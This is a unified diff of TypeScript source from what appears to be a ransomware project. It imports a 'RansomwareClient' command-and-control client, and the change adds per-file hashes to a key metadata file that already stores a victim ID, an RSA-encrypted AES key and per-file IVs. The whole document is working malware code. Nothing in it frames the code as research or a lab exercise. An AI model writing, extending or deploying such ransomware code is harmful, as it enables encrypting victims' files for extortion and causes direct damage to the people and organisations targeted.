@@ -1,8 +1,13 @@
 import crypto from 'crypto'
 import fs from 'fs'
 import path from 'path'
-import { encryptRSA, decryptRSA, generateRSAKeys } from '../rsaComm'
+import {
+    encryptRSA,
+    decryptRSA,
+    generateRSAKeys
+} from '../rsaComm'
 import { RansomwareClient } from './c2Client'
+import { generateFileHash } from '../cryptoUtils'
 
 // Global C2 client instance
 let c2Client: RansomwareClient | null = null;
@@ -152,20 +157,29 @@ export async function decryptAESKey(
 export function createKeyMetadataFile(
     victimId: string,
     encryptedAESKey: Buffer,
-    targetDir: string
+    targetDir: string,
+    fileHashes: Map<string, string> // Added fileHashes parameter
 ): void {
     // Convert the IV map to a serializable object
     const ivMapObj: Record<string, string> = {};
-
     offlineIvMap.forEach((iv: Buffer, filePath: string) => {
-        // Use relative paths for better portability
         const relativePath = path.relative(targetDir, filePath);
         ivMapObj[relativePath] = iv.toString('base64');
-    });    // Create the metadata object
+    });
+
+    // Convert the fileHashes map to a serializable object
+    const fileHashesObj: Record<string, string> = {};
+    fileHashes.forEach((hash, filePath) => {
+        const relativePath = path.relative(targetDir, filePath);
+        fileHashesObj[relativePath] = hash;
+    });
+
+    // Create the metadata object
     const metadata = {
         victimId,
         encryptedAESKey: encryptedAESKey.toString('base64'),
         ivMap: ivMapObj,
+        fileHashes: fileHashesObj, // Added fileHashes to metadata
         timestamp: new Date().toISOString(),
         isOfflineMode: isOfflineMode
     }
@@ -184,6 +198,7 @@ export function readKeyMetadataFile(
 ): {
     victimId: string
     ivMap: Map<string, Buffer>
+    fileHashes: Map<string, string> // Added fileHashes to return type
 } {
     // Read the metadata file
     const metadataStr = fs.readFileSync(metadataPath, 'utf8')
@@ -194,18 +209,22 @@ export function readKeyMetadataFile(
 
     // Convert the IV map back to a Map object
     const ivMap = new Map<string, Buffer>()
-
     Object.entries(metadata.ivMap).forEach(([relativePath, ivBase64]) => {
-        // Convert relative paths back to absolute paths
         const absolutePath = path.join(targetDir, relativePath)
         const iv = Buffer.from(ivBase64 as string, 'base64');
-        
         ivMap.set(absolutePath, iv)
-        
-        // Also update the offline map for future use
         offlineIvMap.set(absolutePath, iv);
-    })
-    
+    });
+
+    // Extract file hashes
+    const fileHashes = new Map<string, string>();
+    if (metadata.fileHashes) {
+        Object.entries(metadata.fileHashes).forEach(([relativePath, hash]) => {
+            const absolutePath = path.join(targetDir, relativePath);
+            fileHashes.set(absolutePath, hash as string);
+        });
+    }
+
     // Set offline mode flag based on metadata
     isOfflineMode = metadata.isOfflineMode === true;
 
@@ -214,7 +233,8 @@ export function readKeyMetadataFile(
 
     return {
         victimId,
-        ivMap
+        ivMap,
+        fileHashes // Added fileHashes to return object
     }
 }
 
